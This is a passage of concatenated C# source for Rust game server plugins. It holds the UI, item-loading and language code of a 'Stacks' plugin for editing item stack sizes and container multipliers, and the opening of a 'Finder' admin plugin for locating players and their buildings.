            #endregion

            #endregion

            var maxCount = 0;

            switch (type)
            {
                case 0: //Item
                {
                    #region Categories

                    var amountOnString = 6;
                    width = 90;
                    margin = 5;
                    height = 25;
                    ySwitch = -60;

                    xSwitch = 20;

                    container.Add(new CuiButton
                    {
                        RectTransform =
                        {
                            AnchorMin = "0 1", AnchorMax = "0 1",
                            OffsetMin = $"{xSwitch} {ySwitch - height}",
                            OffsetMax = $"{xSwitch + width} {ySwitch}"
                        },
                        Text =
                        {
                            Text = Msg(player, AllTitle),
                            Align = TextAnchor.MiddleCenter,
                            Font = "robotocondensed-bold.ttf",
                            FontSize = 12,
                            Color = "1 1 1 1"
                        },
                        Button =
                        {
                            Color = -1 == category ? HexToCuiColor("#4B68FF") : HexToCuiColor("#161617"),
                            Command = $"UI_Stacks page {type} {-1}"
                        }
                    }, Layer + ".Main");

                    xSwitch += width + margin;

                    for (var i = 0; i < _categories.Count; i++)
                    {
                        var info = _categories[i];

                        container.Add(new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 1", AnchorMax = "0 1",
                                OffsetMin = $"{xSwitch} {ySwitch - height}",
                                OffsetMax = $"{xSwitch + width} {ySwitch}"
                            },
                            Text =
                            {
                                Text = $"{info.Title}",
                                Align = TextAnchor.MiddleCenter,
                                Font = "robotocondensed-bold.ttf",
                                FontSize = 12,
                                Color = "1 1 1 1"
                            },
                            Button =
                            {
                                Color = i == category ? HexToCuiColor("#4B68FF") : HexToCuiColor("#161617"),
                                Command = $"UI_Stacks page {type} {i}"
                            }
                        }, Layer + ".Main");

                        if ((i + 2) % amountOnString == 0)
                        {
                            ySwitch = ySwitch - height - margin;
                            xSwitch = 20;
                        }
                        else
                        {
                            xSwitch += width + margin;
                        }
                    }

                    #endregion

                    #region Items

                    ySwitch = ySwitch - height - 5;

                    margin = 5;
                    height = 50f;
                    xSwitch = 20;
                    width = 565;
                    lines = 6;

                    var categoryInfo = category == -1
                        ? _categories.SelectMany(x => x.Items).ToList()
                        : _categories[category].Items;

                    var items = string.IsNullOrEmpty(search) || search.Length < 2
                        ? categoryInfo
                        : categoryInfo.FindAll(x => x.Name.StartsWith(search) || x.Name.Contains(search) ||
                                                    x.ShortName.StartsWith(search) || x.ShortName.Contains(search));

                    maxCount = items.Count;

                    foreach (var item in items.Skip(page * lines).Take(lines))
                    {
                        container.Add(new CuiPanel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 1", AnchorMax = "0 1",
                                OffsetMin = $"{xSwitch} {ySwitch - height}",
                                OffsetMax = $"{xSwitch + width} {ySwitch}"
                            },
                            Image =
                            {
                                Color = HexToCuiColor("#161617")
                            }
                        }, Layer + ".Main", Layer + $".Panel.{item.ShortName}");

                        if (ImageLibrary)
                            container.Add(new CuiElement
                            {
                                Parent = Layer + $".Panel.{item.ShortName}",
                                Components =
                                {
                                    new CuiRawImageComponent
                                        { Png = ImageLibrary.Call<string>("GetImage", item.ShortName) },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 0.5", AnchorMax = "0 0.5",
                                        OffsetMin = "20 -15", OffsetMax = "50 15"
                                    }
                                }
                            });

                        #region Name

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "1 1",
                                OffsetMin = "55 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = $"{item.Name}",
                                Align = TextAnchor.MiddleLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 1"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        #endregion

                        #region Default Stack

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0.5", AnchorMax = "1 1",
                                OffsetMin = "180 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = Msg(player, DefaultStack),
                                Align = TextAnchor.LowerLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 0.5"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "1 0.5",
                                OffsetMin = "180 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = Msg(player, StackFormat, item.DefaultStackSize),
                                Align = TextAnchor.UpperLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 1"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        #endregion

                        #region Custom Stack

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0.5", AnchorMax = "1 1",
                                OffsetMin = "310 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = Msg(player, CustomStack),
                                Align = TextAnchor.LowerLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 0.5"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "1 0.5",
                                OffsetMin = "310 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = Msg(player, StackFormat,
                                    item.CustomStackSize == 0 ? item.DefaultStackSize : item.CustomStackSize),
                                Align = TextAnchor.UpperLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 1"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        #endregion

                        #region Settings

                        container.Add(new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = "1 0.5", AnchorMax = "1 0.5",
                                OffsetMin = "-110 -12.5",
                                OffsetMax = "-10 12.5"
                            },
                            Text =
                            {
                                Text = Msg(player, SettingsTitle),
                                Align = TextAnchor.MiddleCenter,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 1"
                            },
                            Button =
                            {
                                Color = HexToCuiColor("#4B68FF"),
                                Command =
                                    $"UI_Stacks settings {type} {category} {(string.IsNullOrEmpty(search) ? page : 0)} {item.ID}"
                            }
                        }, Layer + $".Panel.{item.ShortName}");

                        #endregion

                        ySwitch = ySwitch - height - margin;
                    }

                    #endregion

                    break;
                }

                case 1: //Container
                {
                    #region Items

                    ySwitch = -65;

                    margin = 10;
                    height = 60;
                    xSwitch = 20;
                    width = 565;
                    lines = 6;

                    var containers = string.IsNullOrEmpty(search) || search.Length < 2
                        ? _containers.ToList()
                        : _containers.Where(x => x.Key.EndsWith(search) || x.Key.Contains(search)).ToList();

                    maxCount = containers.Count;

                    foreach (var check in containers.Skip(page * lines).Take(lines))
                    {
                        container.Add(new CuiPanel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 1", AnchorMax = "0 1",
                                OffsetMin = $"{xSwitch} {ySwitch - height}",
                                OffsetMax = $"{xSwitch + width} {ySwitch}"
                            },
                            Image =
                            {
                                Color = HexToCuiColor("#161617")
                            }
                        }, Layer + ".Main", Layer + $".Panel.{ySwitch}");

                        #region Image

                        container.Add(new CuiPanel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "0 0",
                                OffsetMin = "5 5", OffsetMax = "55 55"
                            },
                            Image =
                            {
                                Color = HexToCuiColor("#0E0E10", 50)
                            }
                        }, Layer + $".Panel.{ySwitch}", Layer + $".Panel.{ySwitch}.Image");

                        container.Add(new CuiElement
                        {
                            Parent = Layer + $".Panel.{ySwitch}.Image",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = ImageLibrary.Call<string>("GetImage",
                                        string.IsNullOrEmpty(check.Value.Image) ? "NONE" : check.Value.Image)
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 0", AnchorMax = "1 1"
                                }
                            }
                        });

                        #endregion

                        #region Prefab

                        container.Add(new CuiPanel
                        {
                            RectTransform =
                            {
                                AnchorMin = "1 1", AnchorMax = "1 1",
                                OffsetMin = "-500 -25", OffsetMax = "0 0 0 0"
                            },
                            Image =
                            {
                                Color = HexToCuiColor("#0E0E10", 50)
                            }
                        }, Layer + $".Panel.{ySwitch}", Layer + $".Panel.{ySwitch}.Prefab");

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "1 1",
                                OffsetMin = "5 0", OffsetMax = "0 0"
                            },
                            Text =
                            {
                                Text = $"{check.Key}",
                                Align = TextAnchor.MiddleLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                                Color = "1 1 1 0.5"
                            }
                        }, Layer + $".Panel.{ySwitch}.Prefab");

                        #endregion

                        #region Info

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "0 0",
                                OffsetMin = "70 0",
                                OffsetMax = "200 35"
                            },
                            Text =
                            {
                                Text = Msg(player, DefaultMultiplier, _config.DefaultContainerMultiplier),
                                Align = TextAnchor.MiddleLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 0.5"
                            }
                        }, Layer + $".Panel.{ySwitch}");

                        container.Add(new CuiLabel
                        {
                            RectTransform =
                            {
                                AnchorMin = "0 0", AnchorMax = "0 0",
                                OffsetMin = "260 0",
                                OffsetMax = "400 35"
                            },
                            Text =
                            {
                                Text = Msg(player, CustomMultiplier, check.Value.Multiplier),
                                Align = TextAnchor.MiddleLeft,
                                Font = "robotocondensed-regular.ttf",
                                FontSize = 12,
                                Color = "1 1 1 0.5"
                            }
                        }, Layer + $".Panel.{ySwitch}");

                        #endregion

                        container.Add(new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = "1 0", AnchorMax = "1 0",
                                OffsetMin = "-90 7.5", OffsetMax = "-10 27.5"
                            },
                            Text =
                            {
                                Text = Msg(player, SettingsTitle),
                                Align = TextAnchor.MiddleCenter,
                                FontSize = 14,
                                Font = "robotocondensed-regular.ttf",
                                Color = "1 1 1 1"
                            },
                            Button =
                            {
                                Color = HexToCuiColor("#4B68FF"),
                                Command =
                                    $"UI_Stacks settings {type} {category} {(string.IsNullOrEmpty(search) ? page : 0)} {check.Value.ID}"
                            }
                        }, Layer + $".Panel.{ySwitch}");

                        ySwitch = ySwitch - height - margin;
                    }

                    #endregion

                    break;
                }
            }

            #region Pages

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0.5 0", AnchorMax = "0.5 0",
                    OffsetMin = "-50 5", OffsetMax = "50 25"
                },
                Image =
                {
                    Color = HexToCuiColor("#161617")
                }
            }, Layer + ".Main", Layer + ".Pages");

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "0 0",
                    AnchorMax = "0 1",
                    OffsetMin = "-20 0",
                    OffsetMax = "0 0"
                },
                Text =
                {
                    Text = Msg(player, BtnBack),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 10,
                    Color = "1 1 1 0.95"
                },
                Button =
                {
                    Color = HexToCuiColor("#4B68FF", 33),
                    Command = page != 0 ? $"UI_Stacks page {type} {category} {page - 1} {search}" : ""
                }
            }, Layer + ".Pages");

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 0",
                    AnchorMax = "1 1",
                    OffsetMin = "0 0",
                    OffsetMax = "20 0"
                },
                Text =
                {
                    Text = Msg(player, BtnNext),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 10,
                    Color = "1 1 1 0.95"
                },
                Button =
                {
                    Color = HexToCuiColor("#4B68FF"),
                    Command = maxCount > (page + 1) * lines
                        ? $"UI_Stacks page {type} {category} {page + 1} {search}"
                        : ""
                }
            }, Layer + ".Pages");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Text =
                {
                    Text = $"{page + 1}",
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = "1 1 1 0.5"
                }
            }, Layer + ".Pages");

            if (string.IsNullOrEmpty(search))
                container.Add(new CuiElement
                {
                    Parent = Layer + ".Pages",
                    Components =
                    {
                        new CuiInputFieldComponent
                        {
                            FontSize = 12,
                            Align = TextAnchor.MiddleCenter,
                            Font = "robotocondensed-regular.ttf",
                            Command = string.IsNullOrEmpty(search) || search.Length < 2
                                ? $"UI_Stacks page {type} {category} "
                                : $"UI_Stacks enter_page {type} {category} {search} ",
                            Color = "1 1 1 0.95",
                            CharsLimit = 32
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 0", AnchorMax = "1 1"
                        }
                    }
                });

            #endregion

            #endregion

            CuiHelper.DestroyUi(player, Layer + ".Main");
            CuiHelper.AddUi(player, container);
        }

        private void SettingsUi(BasePlayer player, int type, int category, int page, int id, int enterValue = -1,
            bool first = false)
        {
            var nowValue = 0f;

            var container = new CuiElementContainer();

            #region Background

            if (first)
            {
                CuiHelper.DestroyUi(player, Layer);

                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Image =
                    {
                        Color = "0 0 0 0.9",
                        Material = "assets/content/ui/uibackgroundblur.mat"
                    },
                    CursorEnabled = true
                }, "Overlay", Layer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "" },
                    Button =
                    {
                        Color = "0 0 0 0",
                        Close = Layer
                    }
                }, Layer);
            }

            #endregion

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5",
                    OffsetMin = "-300 -160",
                    OffsetMax = "300 160"
                },
                Image =
                {
                    Color = HexToCuiColor("#0E0E10")
                }
            }, Layer, Layer + ".Main");

            #region Header

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0 1", AnchorMax = "1 1",
                    OffsetMin = "0 -50",
                    OffsetMax = "0 0"
                },
                Image = { Color = HexToCuiColor("#161617") }
            }, Layer + ".Main", Layer + ".Header");

            switch (type)
            {
                case 0:
                {
                    var item = _items.Find(x => x.ID == id);
                    if (item == null) return;

                    nowValue = item.CustomStackSize == 0 ? item.DefaultStackSize : item.CustomStackSize;

                    container.Add(new CuiElement
                    {
                        Parent = Layer + ".Header",
                        Components =
                        {
                            new CuiRawImageComponent { Png = ImageLibrary.Call<string>("GetImage", item.ShortName) },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 0", AnchorMax = "0 0",
                                OffsetMin = "5 5", OffsetMax = "45 45"
                            }
                        }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform =
                        {
                            AnchorMin = "0 0", AnchorMax = "1 1",
                            OffsetMin = "50 0", OffsetMax = "0 0"
                        },
                        Text =
                        {
                            Text = $"{item.Name}",
                            Align = TextAnchor.MiddleLeft,
                            Font = "robotocondensed-regular.ttf",
                            FontSize = 12,
                            Color = "1 1 1 1"
                        }
                    }, Layer + ".Header");
                    break;
                }

                case 1:
                {
                    if (_containers.All(x => x.Value.ID != id))
                        return;

                    var cont = _containers.FirstOrDefault(x => x.Value.ID == id);

                    nowValue = cont.Value.Multiplier;

                    container.Add(new CuiElement
                    {
                        Parent = Layer + ".Header",
                        Components =
                        {
                            new CuiRawImageComponent
                            {
                                Png = ImageLibrary.Call<string>("GetImage",
                                    string.IsNullOrEmpty(cont.Value.Image) ? "NONE" : cont.Value.Image)
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 0", AnchorMax = "0 0",
                                OffsetMin = "5 5", OffsetMax = "45 45"
                            }
                        }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform =
                        {
                            AnchorMin = "0 0", AnchorMax = "1 1",
                            OffsetMin = "50 0", OffsetMax = "0 0"
                        },
                        Text =
                        {
                            Text = $"{cont.Key}",
                            Align = TextAnchor.MiddleLeft,
                            Font = "robotocondensed-regular.ttf",
                            FontSize = 12,
                            Color = "1 1 1 1"
                        }
                    }, Layer + ".Header");
                    break;
                }
            }

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = "-80 -37.5",
                    OffsetMax = "-55 -12.5"
                },
                Text =
                {
                    Text = Msg(player, BtnBack),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-bold.ttf",
                    FontSize = 10,
                    Color = HexToCuiColor("#FFFFFF")
                },
                Button =
                {
                    Color = HexToCuiColor("#4B68FF"),
                    Command = $"UI_Stacks page {type} {category} {page}"
                }
            }, Layer + ".Header");

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = "-50 -37.5",
                    OffsetMax = "-25 -12.5"
                },
                Text =
                {
                    Text = Msg(player, CloseButton),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-bold.ttf",
                    FontSize = 10,
                    Color = HexToCuiColor("#FFFFFF")
                },
                Button =
                {
                    Close = Layer,
                    Color = HexToCuiColor("#4B68FF")
                }
            }, Layer + ".Header");

            #endregion

            #region Now

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0.5 1", AnchorMax = "0.5 1",
                    OffsetMin = "-150 -145",
                    OffsetMax = "150 -105"
                },
                Image =
                {
                    Color = HexToCuiColor("#161617")
                }
            }, Layer + ".Main", Layer + ".Value.Now");

            container.Add(new CuiLabel
            {
                RectTransform =
                {
                    AnchorMin = "0 1", AnchorMax = "1 1",
                    OffsetMin = "0 0", OffsetMax = "0 30"
                },
                Text =
                {
                    Text = Msg(player, type == 0 ? CurrentStack : CurrentMultiplier),
                    Align = TextAnchor.MiddleLeft,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = "1 1 1 0.4"
                }
            }, Layer + ".Value.Now");

            container.Add(new CuiLabel
            {
                RectTransform =
                {
                    AnchorMin = "0 0", AnchorMax = "1 1",
                    OffsetMin = "10 0", OffsetMax = "-10 0"
                },
                Text =
                {
                    Text = $"{nowValue}",
                    Align = TextAnchor.MiddleLeft,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = "1 1 1 0.2"
                }
            }, Layer + ".Value.Now");

            #endregion

            #region Input

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0.5 1", AnchorMax = "0.5 1",
                    OffsetMin = "-150 -235",
                    OffsetMax = "150 -195"
                },
                Image =
                {
                    Color = HexToCuiColor("#161617")
                }
            }, Layer + ".Main", Layer + ".Value.Input");

            container.Add(new CuiLabel
            {
                RectTransform =
                {
                    AnchorMin = "0 1", AnchorMax = "1 1",
                    OffsetMin = "0 0", OffsetMax = "0 30"
                },
                Text =
                {
                    Text = Msg(player, type == 0 ? EnterStack : EnterMultiplier),
                    Align = TextAnchor.MiddleLeft,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = "1 1 1 0.4"
                }
            }, Layer + ".Value.Input");

            if (enterValue > 0)
                container.Add(new CuiLabel
                {
                    RectTransform =
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1",
                        OffsetMin = "10 0", OffsetMax = "-10 0"
                    },
                    Text =
                    {
                        Text = $"{enterValue}",
                        Align = TextAnchor.MiddleLeft,
                        Font = "robotocondensed-regular.ttf",
                        FontSize = 12,
                        Color = "1 1 1 0.2"
                    }
                }, Layer + ".Value.Input");

            container.Add(new CuiElement
            {
                Parent = Layer + ".Value.Input",
                Components =
                {
                    new CuiInputFieldComponent
                    {
                        FontSize = 12,
                        Align = TextAnchor.MiddleCenter,
                        Font = "robotocondensed-regular.ttf",
                        Color = "1 1 1 0.95",
                        CharsLimit = 32,
                        Command = $"UI_Stacks settings {type} {category} {page} {id} "
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1",
                        OffsetMin = "10 0", OffsetMax = "-10 0"
                    }
                }
            });

            #endregion

            #region Apply

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "0.5 1", AnchorMax = "0.5 1",
                    OffsetMin = "-150 -300",
                    OffsetMax = "150 -260"
                },
                Text =
                {
                    Text = Msg(player, AcceptTitle),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-bold.ttf",
                    FontSize = 22,
                    Color = "1 1 1 1"
                },
                Button =
                {
                    Color = HexToCuiColor("#4B68FF"),
                    Command = enterValue > 0
                        ? $"UI_Stacks apply_settings {type} {category} {page} {id} {enterValue}"
                        : $"UI_Stacks page {type} {category} {page}"
                }
            }, Layer + ".Main");

            #endregion

            CuiHelper.DestroyUi(player, Layer + ".Main");
            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region Utils

        private static string HexToCuiColor(string hex, float alpha = 100)
        {
            if (string.IsNullOrEmpty(hex)) hex = "#FFFFFF";

            var str = hex.Trim('#');
            if (str.Length != 6) throw new Exception(hex);
            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);

            return $"{(double)r / 255} {(double)g / 255} {(double)b / 255} {alpha / 100f}";
        }

        private void RegisterPermissions()
        {
            if (!permission.PermissionExists(AdminPerm))
                permission.RegisterPermission(AdminPerm, this);
        }

        private void LoadCategories()
        {
            var dict = new Dictionary<ItemCategory, List<ItemDefinition>>();

            ItemManager.itemList.ForEach(info =>
            {
                if (dict.ContainsKey(info.category))
                    dict[info.category].Add(info);
                else
                    dict.Add(info.category, new List<ItemDefinition>
                    {
                        info
                    });
            });

            foreach (var check in dict)
                _categories.Add(new CategoryInfo
                {
                    Title = check.Key.ToString(),
                    Items = _items.FindAll(x => check.Value.Exists(info => info.shortname == x.ShortName))
                });
        }

        private void LoadContainers(bool init)
        {
            foreach (var check in _constContainers.Where(check => !_containers.ContainsKey(check.Key)))
                _containers[check.Key] = new ContainerData
                {
                    Image = check.Value,
                    Multiplier = _config.DefaultContainerMultiplier
                };

            foreach (var check in _containers)
                check.Value.ID = GetContainerId();
        }

        private int GetContainerId()
        {
            var result = -1;

            do
            {
                var val = Random.Range(int.MinValue, int.MaxValue);
                if (_containers.All(x => x.Value.ID != val))
                    result = val;
            } while (result == -1);

            return result;
        }

        private void LoadItems()
        {
            ItemManager.itemList
                .FindAll(info => !_items.Exists(x => x.ShortName == info.shortname))
                .ForEach(info =>
                {
                    _items.Add(new ItemInfo
                    {
                        ShortName = info.shortname,
                        Name = info.displayName.english,
                        DefaultStackSize = info.stackable,
                        CustomStackSize = 0
                    });
                });

            ItemManager.itemList.ForEach(info => _defaultItemStackSize[info.shortname] = info.stackable);

            _items.FindAll(x => x.CustomStackSize != 0).ForEach(UpdateItemStack);

            _items.ForEach(item => item.ID = GetItemId());
        }

        private void UpdateItemStack(ItemInfo info)
        {
            var def = ItemManager.FindItemDefinition(info.ShortName);
            if (def == null) return;

            def.stackable = info.CustomStackSize;
        }

        private int GetItemId()
        {
            var result = -1;

            do
            {
                var val = Random.Range(int.MinValue, int.MaxValue);
                if (!_items.Exists(x => x.ID == val))
                    result = val;
            } while (result == -1);

            return result;
        }

        private void LoadImages()
        {
            if (!ImageLibrary)
            {
                PrintError("IMAGE LIBRARY IS NOT INSTALLED!");
            }
            else
            {
                var imagesList = new Dictionary<string, string>();

                var itemIcons = new List<KeyValuePair<string, ulong>>();

                _items.ForEach(item => itemIcons.Add(new KeyValuePair<string, ulong>(item.ShortName, 0)));

                foreach (var container in _containers.Values.Where(container => !string.IsNullOrEmpty(container.Image)
                    && !imagesList.ContainsKey(container.Image)))
                    imagesList.Add(container.Image, container.Image);

                if (itemIcons.Count > 0) ImageLibrary?.Call("LoadImageList", Title, itemIcons, null);

                ImageLibrary?.Call("ImportImageList", Title, imagesList, 0UL, true);
            }
        }

        private class ItemHelper
        {
            public static bool SplitMoveItem(Item item, int amount, ItemContainer targetContainer, int targetSlot)
            {
                var splitItem = item.SplitItem(amount);
                if (splitItem == null)
                    return false;

                if (!splitItem.MoveToContainer(targetContainer, targetSlot))
                {
                    item.amount += splitItem.amount;
                    splitItem.Remove();
                }

                return true;
            }

            public static bool SplitMoveItem(Item item, int amount, BasePlayer player)
            {
                return SplitMoveItem(item, amount, player.inventory);
            }

            public static bool SplitMoveItem(Item item, int amount, PlayerInventory inventory)
            {
                var splitItem = item.SplitItem(amount);
                if (splitItem == null) return false;
                if (!inventory.GiveItem(splitItem))
                {
                    item.amount += splitItem.amount;
                    splitItem.Remove();
                }

                return true;
            }

            public static void SwapItems(Item item1, Item item2)
            {
                var container1 = item1.parent;
                var container2 = item2.parent;
                var slot1 = item1.position;
                var slot2 = item2.position;
                item1.RemoveFromContainer();
                item2.RemoveFromContainer();
                item1.MoveToContainer(container2, slot2);
                item2.MoveToContainer(container1, slot1);
            }
        }

        #endregion

        #region Lang

        private const string
            SetStack = "SettedStack",
            NoPermission = "NoPermission",
            AcceptTitle = "AcceptTitle",
            EnterMultiplier = "EnterMultiplier",
            CurrentMultiplier = "CurrentMultiplier",
            EnterStack = "EnterStack",
            CurrentStack = "CurrentStack",
            CustomMultiplier = "CustomMultiplier",
            DefaultMultiplier = "DefaultMultiplier",
            SettingsTitle = "SettingsTitle",
            StackFormat = "StackFormat",
            CustomStack = "CustomStack",
            DefaultStack = "DefaultStack",
            AllTitle = "AllTitle",
            SearchTitle = "SearchTitle",
            BtnBack = "BtnBack",
            BtnNext = "BtnNext",
            ItemTitle = "ItemTitle",
            ContainerTitle = "ContainerTitle",
            CloseButton = "CloseButton",
            TitleMenu = "TitleMenu";

        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                [NoPermission] = "You don't have the required permission",
                [AllTitle] = "All",
                [CloseButton] = "✕",
                [TitleMenu] = "Stacks",
                [ContainerTitle] = "Container",
                [ItemTitle] = "Item",
                [BtnBack] = "◀",
                [BtnNext] = "▶",
                [SearchTitle] = "Search...",
                [DefaultStack] = "Default stack size",
                [CustomStack] = "Custom stack size",
                [StackFormat] = "x{0}",
                [SettingsTitle] = "Settings",
                [DefaultMultiplier] = "Default Multiplier: <color=white>x{0}</color>",
                [CustomMultiplier] = "Now Multiplier: <color=white>x{0}</color>",
                [CurrentStack] = "Current stack size:",
                [CurrentMultiplier] = "Current multiplier:",
                [EnterStack] = "Enter the new stack size:",
                [EnterMultiplier] = "Enter the multiplier:",
                [AcceptTitle] = "ACCEPT",
                [SetStack] = "You have set the stack size to {0} for the '{1}'"
            }, this);
        }

        private string Msg(string key, string userid = null, params object[] obj)
        {
            return string.Format(lang.GetMessage(key, this, userid), obj);
        }

        private string Msg(BasePlayer player, string key, params object[] obj)
        {
            return string.Format(lang.GetMessage(key, this, player.UserIDString), obj);
        }

        private void Reply(BasePlayer player, string key, params object[] obj)
        {
            SendReply(player, Msg(player, key, obj));
        }

        private void SendNotify(BasePlayer player, string key, int type, params object[] obj)
        {
            if (Notify && _config.UseNotify)
                Notify?.Call("SendNotify", player, type, Msg(player, key, obj));
            else
                Reply(player, key, obj);
        }

        #endregion
    }
}

// --- End of file: Stacks.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Finder.cs ---
// --- Original Local Path: Finder.cs ---

using System.Collections.Generic;
using System;
using System.Reflection;
using System.Data;
using UnityEngine;
using System.Linq;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Logging;
using Oxide.Core.Plugins;
using Oxide.Core.Libraries.Covalence;

namespace Oxide.Plugins
{
    [Info("Finder", "Reneb", "3.0.2", ResourceId = 692)]
    class Finder : RustPlugin
    {
        //////////////////////////////////////////////////////////////////////////////////////////
        ///// Plugin References
        //////////////////////////////////////////////////////////////////////////////////////////
        [PluginReference]
        Plugin PlayerDatabase;

        Dictionary<ulong, PlayerFinder> cachedFinder = new Dictionary<ulong, PlayerFinder>();

        static string findPermission = "finder.find";
        static int findAuthlevel = 1;


        protected override void LoadDefaultConfig() { }

        private void CheckCfg<T>(string Key, ref T var)
        {
            if (Config[Key] is T)
                var = (T)Config[Key];
            else
                Config[Key] = var;
        }

        void Init()
        {
            CheckCfg<int>("auth level permission", ref findAuthlevel);
            CheckCfg<string>("oxide Permission", ref findPermission);

            SaveConfig();
        }

        void Loaded()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"You don't have the permission to use this command","You don't have the permission to use this command" },
                {"ListCommands","/find player PLAYERNAME/STEAMID\n\r/find cupboard PLAYERNAME/STEAMID\n\r/find bag PLAYERNAME/STEAMID\n\r/find building PLAYERNAME/STEAMID\n\r/find item ITEMNAME MINAMOUNT\n\r/find tp FINDID" },
                {"Multiple players found:\n\r","Multiple players found:\n\r" },
                {"No matching players found.","No matching players found." },
                {"You need to select a target player.","You need to select a target player." },
                {"This player doesn't have a position","This player doesn't have a position" },
                {"This player doesn't have any cupboard privileges","This player doesn't have any cupboard privileges" },
                {"You didn't find anything yet","You didn't find anything yet" },
                {"You need to select a target findid.","You need to select a target findid." },
                {"This id is out of range.","This id is out of range." },
                {"You are using the console, you can't tp!","You are using the console, you can't tp!" },
                {"This player hasn't built anything yet","This player hasn't built anything yet" },
                {"usage: /find item ITEMNAME MINAMOUNT.","usage: /find item ITEMNAME MINAMOUNT." },
                {"You didn't use a valid item name.","You didn't use a valid item name." }
            }, this);
        }

        bool hasPermission(BasePlayer player, string perm, int authLevel)
        {
            var lvl = player?.net?.connection?.authLevel;
            if (lvl == null || lvl >= authLevel) { return true; }

            return permission.UserHasPermission(player.userID.ToString(), perm);
        }

        string GetMsg(string key, BasePlayer player = null)
        {
            return lang.GetMessage(key, this, player == null ? null : player.userID.ToString());
        }

        class FindData
        {
